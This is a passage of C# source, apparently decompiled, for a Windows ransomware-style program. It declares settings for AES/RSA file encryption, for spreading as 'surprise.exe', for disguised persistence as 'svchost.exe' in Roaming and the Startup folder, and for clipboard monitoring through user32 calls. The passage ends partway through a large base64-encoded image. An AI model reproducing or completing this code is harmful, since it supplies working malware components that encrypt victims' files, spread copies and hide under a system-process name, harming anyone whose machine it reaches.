using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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